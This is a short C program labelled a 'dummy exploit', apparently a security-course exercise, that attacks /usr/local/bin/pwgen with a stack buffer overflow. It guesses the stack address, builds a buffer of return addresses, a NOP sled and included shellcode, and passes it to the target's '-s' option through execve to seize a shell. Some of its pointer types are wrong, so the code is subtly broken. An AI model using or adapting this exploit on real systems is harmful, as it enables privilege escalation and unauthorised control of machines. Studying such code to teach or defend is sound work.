/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define DBSIZE 2048
#define DOFFSET 0
#define TARGET "/usr/local/bin/pwgen"
#define NOP   0x90
unsigned long get_sp(void){
__asm__("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
  char *args[4];
  char *env[1];
  char *buf, *ptr;
  char *addr_ptr, addr;
  // one way to invoke pwgen, system() creates a separate process
  int i;
  int bsize = DBSIZE, offset = DOFFSET;
  

  if(argc > 1) bsize = atoi(argv[1]);
    if(argc > 2) offset = atoi(argv[2]);

  if(!(buf = malloc(bsize))){
    printf("error");
    exit(0);
  }
  addr = get_sp() - offset;
  printf("Using address 0x%x...", addr);



  ptr = buf; 
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
  *(addr_ptr++) = addr;
  for(i = 0 ; i < bsize/2 ; i++)
  buf[i] = NOP;

  ptr = buf + ((bsize/2) - (strlen(shellcode)/2 ));
  for (i = 0 ; i <strlen(shellcode);i++)
      *(ptr++) = shellcode[i];

    buf[bsize - 1] = '\0';//jump here. not overwrite here.



  
   
    args[0] = TARGET; args[1] = "-s";
    args[2] = buf; 
args[3] = NULL;
    env[0] = NULL;
  // execve() executes the target program by overwriting the
  // memory of the process in which execve() is executing, i.e.,
  // execve() should never return
  if (execve(TARGET, args, env) < 0)
  fprintf(stderr, "execve failed.\n");



//printf("%s %s %s",args[0], args[1],  args[2]);
  exit(0);
}
